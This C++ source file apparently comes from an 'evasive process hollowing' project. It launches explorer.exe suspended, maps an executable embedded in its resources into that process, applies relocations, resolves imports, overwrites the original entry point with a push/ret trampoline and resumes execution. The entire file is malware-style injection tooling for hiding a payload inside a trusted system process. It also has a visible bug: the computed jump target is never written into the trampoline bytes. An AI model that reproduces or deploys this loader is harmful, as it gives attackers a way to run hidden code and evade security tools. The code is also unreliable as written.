#include <stdio.h>
#include "helper.h"
#include <windows.h>
#include <wdbgexts.h>
#include "resource.h"

int main()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	PROCESS_BASIC_INFORMATION pbi;
	DWORD oldProtection = NULL;
	LPVOID lpHeaderBuffer[2048];

	const unsigned int pebSize = sizeof(PEB);
	const unsigned int baseAddrLength = 4;
	const unsigned int pebImageBaseAddrOffset = 8;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	HINSTANCE handleNtDll = LoadLibrary("ntdll");

	FARPROC fpNtQueryInformationProcess = GetProcAddress(handleNtDll, "NtQueryInformationProcess");
	FARPROC fpZwUnmapViewOfSection = GetProcAddress(handleNtDll, "ZwUnmapViewOfSection");
	FARPROC fpZwCreateSection = GetProcAddress(handleNtDll, "ZwCreateSection");
	FARPROC fpZwMapViewOfSection = GetProcAddress(handleNtDll, "ZwMapViewOfSection");

	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;
	_ZwUnmapViewOfSection ZwUnmapViewOfSection = (_ZwUnmapViewOfSection)fpZwUnmapViewOfSection;
	_ZwCreateSection ZwCreateSection = (_ZwCreateSection)fpZwCreateSection;
	_ZwMapViewOfSection ZwMapViewOfSection = (_ZwMapViewOfSection)fpZwMapViewOfSection;

	if (!CreateProcess("C:\\Windows\\System32\\explorer.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
	{
		printf("CreateProcess Failed %i.\n", GetLastError());
	}


	/* Retrieves ProcessBasicInformaton info from the created process */
	NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);

	/* Retrieves PEB info of the created process */
	PPEB pPeb = new PEB();
	ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, pPeb, sizeof(PEB), 0);

	/* Find and load exe stored in the PE's resource section */
	HRSRC resc = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	HGLOBAL rescData = LoadResource(NULL, resc);

	/* Get pointer to the resource base address */
	LPVOID lpmyResc = LockResource(rescData);


	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpmyResc;

	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		printf("Failed: .exe does not have a valid signature %i", GetLastError());
	}

	PIMAGE_NT_HEADERS pNTHeaderResource = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + (DWORD)pDosHeader->e_lfanew);
	
	HANDLE secHandle = NULL;

	LARGE_INTEGER pLargeInt;
	pLargeInt.QuadPart = pNTHeaderResource->OptionalHeader.SizeOfImage;

	/* Retrieve the size of the exe that is to be injected */
	SIZE_T commitSize = SizeofResource(NULL, resc);

	SIZE_T viewSizeCreatedPrcess = 0;

	PVOID sectionBaseAddressCreatedProcess = NULL;

	/* Create the section object which will be shared by both the current and created process */
	ZwCreateSection(&secHandle, SECTION_ALL_ACCESS, NULL, &pLargeInt, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	/* Map the created section into the created process's virtual address space */
	ZwMapViewOfSection(secHandle, pi.hProcess, &sectionBaseAddressCreatedProcess, NULL, NULL, NULL, &viewSizeCreatedPrcess, ViewShare, NULL, PAGE_EXECUTE_READWRITE);
	

	PBYTE pHeader = new BYTE[pNTHeaderResource->OptionalHeader.SizeOfHeaders];

	memcpy(pHeader, pDosHeader, pNTHeaderResource->OptionalHeader.SizeOfHeaders);

	/*
	if (!WriteProcessMemory(pi.hProcess, sectionBaseAddressCreatedProcess, lpmyResc, commitSize, NULL))
	{
		printf("Failed wrting resource:  %i", GetLastError());
		return -1;
	}
	*/

	//Relocation Test Begin
	
	/* Copy the headers of the process that is to be injected into the created process */
	if (!WriteProcessMemory(pi.hProcess, sectionBaseAddressCreatedProcess, pHeader, pNTHeaderResource->OptionalHeader.SizeOfHeaders, NULL))
	{
		printf("Failed: Unable to write headers: %i", GetLastError());
		return -1;
	}

	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNTHeaderResource);
	DWORD dwRelocAddr;

	/* Copy the sections of the process that is to be injected into the created process */
	for (int i = 0; i < pNTHeaderResource->FileHeader.NumberOfSections; i++)
	{
		printf("Copying data from: %s\n", pSectionHeader->Name);
		

		if (i == 4) {
			dwRelocAddr = pSectionHeader->PointerToRawData;
		}

		PBYTE pSectionData = new BYTE[(DWORD)pSectionHeader->SizeOfRawData];

		memcpy(pSectionData, (PVOID)((DWORD)pDosHeader + (DWORD)pSectionHeader->PointerToRawData), (DWORD)pSectionHeader->SizeOfRawData);

		if (!WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)sectionBaseAddressCreatedProcess + (DWORD)pSectionHeader->VirtualAddress), pSectionData, (DWORD)pSectionHeader->SizeOfRawData, NULL))
		{
			printf("Failed copying data from %s: %i", pSectionHeader->Name, GetLastError());
			return -1;
		}
		pSectionHeader++;
	}

	int delta = 0;;


	IMAGE_DATA_DIRECTORY relocData = pNTHeaderResource->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	DWORD dwOffset = 0;
	typedef struct BASE_RELOCATION_BLOCK {
		DWORD PageAddress;
		DWORD BlockSize;
	} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

	typedef struct BASE_RELOCATION_ENTRY {
		USHORT Offset : 12;
		USHORT Type : 4;
	} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;
	
	HANDLE hFile = CreateFileA
	(
		"C:\\Users\\pip\\Dev\\EvasiveProcessHollowing\\HollowProcessInjection3\\HollowProcessInjection3\\HelloWorld.exe",
		GENERIC_READ,
		0,
		0,
		OPEN_ALWAYS,
		0,
		0
	);

	PBASE_RELOCATION_BLOCK pBlockheader;
	DWORD dwSize = GetFileSize(hFile, 0);
	PBYTE pBuffer = new BYTE[dwSize];
	DWORD dwBytesRead = 0;
	ReadFile(hFile, pBuffer, dwSize, &dwBytesRead, 0);

	DWORD dwEntryCount;
	PBASE_RELOCATION_ENTRY pBlocks;
	delta = (DWORD)sectionBaseAddressCreatedProcess - (DWORD)pNTHeaderResource->OptionalHeader.ImageBase ;

	while (dwOffset < relocData.Size)
	{
		pBlockheader = (PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];

		dwOffset += sizeof(BASE_RELOCATION_BLOCK);

		dwEntryCount = (pBlockheader->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
		pBlocks = (PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];

		for (DWORD y = 0; y < dwEntryCount; y++)
		{
			dwOffset += sizeof(BASE_RELOCATION_ENTRY);

			if (pBlocks[y].Type == 0)
				continue;

			DWORD dwFieldAddress = pBlockheader->PageAddress + pBlocks[y].Offset;

			DWORD dwBuffer = 0;
			ReadProcessMemory
			(
				pi.hProcess,
				(PVOID)((DWORD)sectionBaseAddressCreatedProcess + dwFieldAddress),
				&dwBuffer,
				sizeof(DWORD),
				0
			);

			printf("Relocating 0x%p -> 0x%p\r\n", dwBuffer, dwBuffer + delta);

			dwBuffer += delta;

			BOOL bSuccess = WriteProcessMemory
			(
				pi.hProcess,
				(PVOID)((DWORD)sectionBaseAddressCreatedProcess + dwFieldAddress),
				&dwBuffer,
				sizeof(DWORD),
				0
			);

			if (!bSuccess)
			{
				printf("Error writing memory\r\n");
				continue;
			}
		}


	}
	//Relcoation Test End
	
	// Resolve IAT Begin

	PBYTE dwBuffer = new BYTE[(DWORD)pNTHeaderResource->OptionalHeader.SizeOfImage];

	ReadProcessMemory
	(
		pi.hProcess,
		sectionBaseAddressCreatedProcess,
		dwBuffer,
		pNTHeaderResource->OptionalHeader.SizeOfImage,
		0
	);

	pDosHeader = (PIMAGE_DOS_HEADER)dwBuffer;

	pNTHeaderResource = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + (DWORD)pDosHeader->e_lfanew);

	DWORD origThunkPtr;
	
	PIMAGE_IMPORT_DESCRIPTOR pImpDecsriptor = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)pDosHeader + (DWORD)pNTHeaderResource->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
	
	while (pImpDecsriptor->Name != NULL) {

		PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((DWORD)pDosHeader + (DWORD)pImpDecsriptor->OriginalFirstThunk);
		PIMAGE_THUNK_DATA pThunkFirst = (PIMAGE_THUNK_DATA)((DWORD)pDosHeader + (DWORD)pImpDecsriptor->FirstThunk);
		LPSTR dllName = (LPSTR)((DWORD)dwBuffer + (DWORD)pImpDecsriptor->Name);

		printf("%s\n", dllName);
		HMODULE dllHmod = LoadLibraryA(dllName);
		

		while (pThunk->u1.AddressOfData != NULL) {

			PIMAGE_IMPORT_BY_NAME pImage = (PIMAGE_IMPORT_BY_NAME)((DWORD)pDosHeader + (DWORD)pThunk->u1.Function);
			HANDLE proc = GetProcAddress(dllHmod, pImage->Name);
			
			printf("%s -> 0x%08x -> 0x%08x\n", pImage->Name, proc, pThunkFirst->u1.AddressOfData);
			LPDWORD thunkPtr = (LPDWORD)&pThunkFirst->u1.AddressOfData;
			pThunkFirst->u1.Function = (DWORD)proc;
			
			/*
			if (strcmp(pImage->Name, "MessageBoxA") == 0) {

				LPDWORD thunkPtr = (LPDWORD)&pThunkFirst->u1.AddressOfData;

				VirtualProtect(thunkPtr, sizeof(LPDWORD), PAGE_EXECUTE_READWRITE, &oldProtection);

				origThunkPtr = (DWORD)pThunkFirst->u1.AddressOfData;

				VirtualProtect(thunkPtr, sizeof(LPDWORD), oldProtection, &oldProtection);

			}
			*/
			pThunk++;
		}

		pImpDecsriptor++;
	}
	
	BOOL bSuccess = WriteProcessMemory
	(
		pi.hProcess,
		sectionBaseAddressCreatedProcess,
		dwBuffer,
		pNTHeaderResource->OptionalHeader.SizeOfImage,
		0
	);

	// Resolve IAT End
	pSectionHeader = IMAGE_FIRST_SECTION(pNTHeaderResource);


	/* Retrieve the PEB associated with the created process */
	ReadProcessMemory(pi.hProcess, pPeb->ImageBaseAddress, lpHeaderBuffer, pebSize, NULL);

	PIMAGE_DOS_HEADER pDosHeaderCreatedProcess = (PIMAGE_DOS_HEADER)(LPVOID)lpHeaderBuffer;

	if (pDosHeaderCreatedProcess->e_magic != IMAGE_DOS_SIGNATURE)
	{
		printf("Failed: .exe does not have a valid signature %i", GetLastError());
	}

	PIMAGE_NT_HEADERS pNTHeaderCreatedProcess = (PIMAGE_NT_HEADERS)((DWORD)pDosHeaderCreatedProcess + (DWORD)pDosHeaderCreatedProcess->e_lfanew);
	
	/*
		0x68       PUSH DWORD
		0x00000000 <MAPPED SECTION BASE ADDRESS>
		0xc3       RET
	
	*/

	BYTE opCodeBuffer[6] = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xc3 };

	VirtualProtectEx(
		pi.hProcess,
		(LPVOID)((DWORD)pPeb->ImageBaseAddress + (DWORD)pNTHeaderCreatedProcess->OptionalHeader.AddressOfEntryPoint),
		sizeof(opCodeBuffer),
		PAGE_EXECUTE_READWRITE,
		&oldProtection
	);

	/* Copy the section base address into the buffer containing the opcode*/
	DWORD r = (DWORD)sectionBaseAddressCreatedProcess + (DWORD)pNTHeaderResource->OptionalHeader.AddressOfEntryPoint;

	WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)pPeb->ImageBaseAddress + (DWORD)pNTHeaderCreatedProcess->OptionalHeader.AddressOfEntryPoint), opCodeBuffer, sizeof(opCodeBuffer), NULL);

	VirtualProtectEx(
		pi.hProcess,
		(LPVOID)((DWORD)pPeb->ImageBaseAddress + (DWORD)pNTHeaderCreatedProcess->OptionalHeader.AddressOfEntryPoint),
		sizeof(opCodeBuffer),
		oldProtection,
		&oldProtection
	);




	printf("Created Process id: %i\n", pi.dwProcessId);
	printf("Created Process Image Base Address: %p\n", pPeb->ImageBaseAddress);
	printf("Injected process Image Base Address %p\n", sectionBaseAddressCreatedProcess);




	ResumeThread(pi.hThread);


	return 0;
}